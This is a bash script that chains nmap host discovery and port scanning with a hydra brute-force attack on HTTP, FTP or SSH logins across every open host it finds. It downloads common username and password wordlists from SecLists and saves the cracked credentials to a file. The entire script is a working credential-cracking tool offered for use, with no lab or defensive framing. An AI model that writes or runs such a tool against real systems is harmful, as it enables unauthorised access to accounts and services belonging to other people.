#!/bin/bash
clear 
echo "************************************************************************************************************************************************
      
=================================================ADVANCE NMAP SCANNER WITH HYDRA================================================================
      
************************************************************************************************************************************************"

printf "\n \n"
echo -n "Enter host ip/network/domain/file:"
read ip
if [ -f $ip ]
then
	ip="-iL $ip"
fi
echo "Which protocol you wish to target"
port=""
select prot in http ftp ssh
do      
	case $prot in
		http) echo -n "Specify port number(leave empty for default):"
			prot=http
			read port
			 	if [ -z $port  ]
				then
					port="80"
				fi 
				break
				;;
		ftp) echo -n "Specify port number(leave empty for default):"
			prot=ftp
			read port
			 	if [ -z $port  ]
				then
					port="21"
				fi 
				break
				;;       	
		ssh) echo -n "Specify port number(leave empty for default):"
			prot=ssh
			read port
			 	if [ -z $port  ]
				then
					port="22"
				fi 
				break
				;;
		 *) echo "Error select option (1) (2) or (3)" ;;
	 esac
 done
echo "Detecting live hosts............"
dt=`date | cut -d " " -f2,3,6 | tr " " -`
nmap -sn $ip | grep "Nmap scan report for"| cut -d " " -f5 > livehosts-$dt
if [[ ! -s livehosts-$dt  ]] 
then
	echo "Sorry None of the host is live right now"
	rm -f livehosts-$dt
	exit 1
else 
	echo "Started port scan............"
	nmap -p$port -iL livehosts-$dt -oG portstats.txt >> /dev/null 
fi
cat portstats.txt | grep $port/open | cut -d " " -f2 > open-hosts-$dt
rm -f portstats-$dt
us=""
pass=""
user()
{
	echo -n "Enter username or file containing it:"
	read us
	if [ -f $us  ]
	then
		us="-L $us"
	else
		us="-l $us"
	fi
}
password()
{
	echo -n "Enter password or file containing it:"
	read pass
	if [ -f $pass  ]
	then
		pass="-P $pass"
	else
		pass="-p $pass"
	fi
}

if [[ ! -s open-hosts-$dt  ]] 
then
	echo "Sorry no open ports found among live hosts.........."
	rm open-hosts-$dt
	exit 1
else 
	echo "Do you want to download username/passwords files from server"
	echo -n "(U)sername (P)assword (B)oth (s)kip: "
	read sel
	case $sel in
		"U"|"u")
			wget https://github.com/danielmiessler/SecLists/raw/master/Usernames/top-usernames-shortlist.txt
			echo -n "Do you wish to use this file for userlist [y/n]:"
			read a
			case $a in
				"y") us="-L top-usernames-shortlist.txt"
					password
					;;
				  *) user
				     password
			   		;;	     
			esac 
       				;;			
		"P"|"p")
			wget https://github.com/danielmiessler/SecLists/raw/master/Passwords/Common-Credentials/10-million-password-list-top-10000.txt
	
			echo -n "Do you wish to use this file for passlist [y/n]:"	
			read a
			case $a in
				"y") pass="-P 10-million-password-list-top-10000.txt"
					user     
					;;
			       	  *) user 
				     password
			   		;;	     
				esac
			;;	
		"B"|"b")	
			wget https://github.com/danielmiessler/SecLists/raw/master/Usernames/top-usernames-shortlist.txt
			wget https://github.com/danielmiessler/SecLists/raw/master/Passwords/Common-Credentials/10-million-password-list-top-10000.txt                      	
			echo -n "Which file you wish to use for lists (U)ser (P)ass (B)oth (N)one:"	
			read a
			case $a in
				  "B"|"b")us="-L top-usernames-shortlist.txt" 
				   	  pass="-P 10-million-password-list-top-10000.txt"
					  ;;
				  "U"|"u")us="-L top-usernames-shortlist.txt"
					  password
					  ;; 
			       	  "P"|"p")  
				   	 pass="-P 10-million-password-list-top-10000.txt"
				     	 user
			   		;;
			   	        *) user
					   password
		   			 ;;			   
			esac
			;;
		      *)  user
			  password
		      	  ;;
	esac
	if [ $prot == http ]
	then
		echo -n "Enter which method to use (h)ttp-post-form  http-(g)et:"
		read prot
			case $prot in
				"H"|"h") prot="http-post-form"
					;;
				"G"|"g") prot="http-get"
					;;
			esac		
	fi
	echo "All set now starting hydra (output file in cracked.txt)....................."
	hydra $us $pass -s $port -M open-hosts-$dt $prot > cracked.txt 
	
fi 
